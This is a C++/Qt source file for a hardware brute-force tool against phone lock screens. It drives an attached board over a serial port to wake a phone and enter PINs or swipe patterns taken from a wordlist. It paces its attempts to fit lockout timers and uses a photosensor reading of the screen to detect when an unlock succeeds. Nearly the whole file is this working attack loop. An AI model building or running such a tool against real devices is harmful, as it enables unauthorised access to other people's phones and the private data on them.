#include "bfworker.h"
#include <QDebug>
#include <QDateTime>

BFWorker::BFWorker(QObject * parent)
{
    connect(this,SIGNAL(wakeUpPhone()),this,SLOT(wakePhone()));
    connect(this,SIGNAL(readPhotosensorValue()),this,SLOT(getPhotosensor()));
    connect(this,SIGNAL(sendString(QByteArray)),this,SLOT(writeData(QByteArray)));
    startIndex = 0;    
}

bool BFWorker::connectBFClient(SettingsDialog::Settings portSettings)
{
    serialConn = new QSerialPort();
    serialConn->setPortName(portSettings.name);
    serialConn->setBaudRate(portSettings.baudRate);
    serialConn->setDataBits(portSettings.dataBits);
    serialConn->setParity(portSettings.parity);
    serialConn->setStopBits(portSettings.stopBits);
    serialConn->setFlowControl(portSettings.flowControl);
    serialConn->open(QIODevice::ReadWrite);
    return serialConn->isOpen();
}

bool BFWorker::isConnected()
{
    if (serialConn != nullptr)
        return serialConn->isOpen();
    else
        return false;
}

void BFWorker::disconnectBFClient()
{
    if (serialConn->isOpen())
        serialConn->disconnect();
}

void BFWorker::run()
{
     qDebug() << "Worker thread " << thread()->currentThreadId();

     if (serialConn->isOpen()) {
         emit updateConsole("connected  "+serialConn->portName().toUtf8()+".");
         int currentLine = startIndex;
         bool testPassword = true;

         while((testPassword) && (currentLine < wordlist->size()))
         {
            QString roundPassword = wordlist->at(currentLine);

            //1
            emit wakeUpPhone();
            QThread::currentThread()->msleep(1250); //awaits a bit for login screen animation

            //2
            emit updateConsole("sending password >>"+roundPassword.toUtf8()+"<<");
            emit sendString(roundPassword.toUtf8()+"\n");  //tries password
            emit updateConsole("round "+QString::number(currentLine).toUtf8()+" of "+QString::number(wordlist->size()).toUtf8()+".");

            //3
            int totalDelay = 12150;                 //delay in milisseconds for basic PIN

            if (deviceLockType == SWIPE)
            {
                int baseWaitPatternDrawing = 16750; //delay in milisseconds for basic 4 dots
                int timeSwipeDot = 1850;            //delay in milisseconds for each additional dot of the swipe pattern
                totalDelay = baseWaitPatternDrawing + ((roundPassword.length()-4) * timeSwipeDot);
            }

            QThread::currentThread()->msleep(totalDelay);   //awaits for screen to turn off if pwd was wrong

            //4
            emit readPhotosensorValue();
            QThread::currentThread()->msleep(850);          //small delay to receive response from Leonardo

            if ((currentScreen > (screenOff+25)) || (currentScreen < (screenOff*0)))
            {
                emit updateConsole("!!! PHOTOSENSOR out of threshold. STOPPING SEARCH !!!");
                testPassword = false;
            }

            //5
            QThread::currentThread()->msleep(19150); //timeout before next attempt

            currentLine++;
         }
     }
}

void BFWorker::writeData(const QByteArray &data)
{
    serialConn->write(data);
    //emit updateConsole("Sent: "+data.simplified()+".");
}

void BFWorker::readData()
{
    const QByteArray data = serialConn->readAll();
}

void BFWorker::wakePhone()
{
    this->writeData("B");
    emit updateConsole("wake up phone.");
}

int BFWorker::getPhotosensor()
{
    this->writeData("P");

    serialConn->waitForReadyRead();
    QByteArray data = serialConn->readLine();
    while (!(data.contains("\n")))
    {
        serialConn->waitForReadyRead();
        data.append(serialConn->readLine());
    }

    qDebug() << QDateTime::currentDateTime().toString("yyyy.MM.dd-hh:mm:ss.zzz") << " sensor:" <<data.simplified();

    currentScreen = data.toInt();
    emit updateConsole("screen value "+data.simplified()+
                       ". Limit MIN:"+QString::number(screenOff*0)+
                       " MAX:"+QString::number(screenOff+25)+".");
    return data.toInt();
}

void BFWorker::displayCalibration()
{
    this->writeData("C");
    emit updateConsole(QString("display calibration pattern."));
}

void BFWorker::setWordlist(QStringList wordlistAttack)
{
    this->wordlist = new QStringList(wordlistAttack);
}
